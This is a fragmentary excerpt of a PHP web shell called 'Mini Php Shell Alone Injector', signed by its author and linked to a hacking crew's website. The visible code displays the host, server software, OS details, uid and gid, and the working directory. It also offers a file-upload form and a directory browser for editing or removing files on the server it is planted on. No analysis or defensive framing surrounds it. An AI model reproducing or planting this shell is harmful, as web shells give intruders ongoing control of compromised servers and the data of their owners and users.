...
<title>Mini Php Shell Alone Injector</title>
...
<body bgcolor="#000000"
background="http://sphotos.ak.fbcdn.net/hphotos-ak-snc4/hs1338.snc4/163084_194272833919515_100000103989299_786756_1
673828_n.jpg" link="#444444" vlink="#444444">

<h1 style='color: #fff'><u><a href="<?php print $_SERVER['PHP_SELF']; ?>"
style="color: #fff">

Mini Php Shell jos_ali_joe V27.9</a></u></h1>

<p style="color: #fff">Coded by jos_ali_joe<br><br># web: <u><a
http://explorecrew.org/" style="display: inline;

color: #fff">http://explorecrew.org/</a></u><br> # Contact : ali@explorecrew.org
</u></p><br>
...
print "<tr><td>~ host
</td><td><b>".$_SERVER['SERVER_NAME']."</b></td></tr>";

print "<tr><td>~ server
</td><td><b>".$_SERVER['SERVER_SOFTWARE']."</b></td></tr>";

if (is_callable("php_uname"))

print "<tr><td>~ os
</td><td><b>".php_uname()."</b></td></tr>";
...
print "<tr><td>~ uid </td><td><b>$uid
($uname)</b></td></tr>";

print "<tr><td>~ gid </td><td><b>$gid
($gname)</b></td></tr>";
...
<form enctype="multipart/form-data" action="<?php print $_SERVER['REQUEST_URI']; ?>"
method="POST">
...
print "# Warning: editing or removing a file is only possible if you've got the privileges to do
that<br><br>";
...
print "<font color=\"white\">&gt; cwd:
<b>".getcwd()."</b></font><br><br>\n\n";
...
<form name="post" id="post" action="<?php print $_SERVER['REQUEST_URI']; ?>"
method="POST">
...
print "<td width=\"40px\" id=\"cell\" style=\"font-size:
9px\">UP</td>\n";

print "<td id=\"cell\"><input type=\"submit\" name=\"dirname\"
value=\"$new\" class=\"buttons\"></td></tr>\n";
...
print "<td id=\"cell\"><input type=\"submit\" name=\"fname\"
value=\"$dir[$i]\" class=\"buttons\"></td>\n";
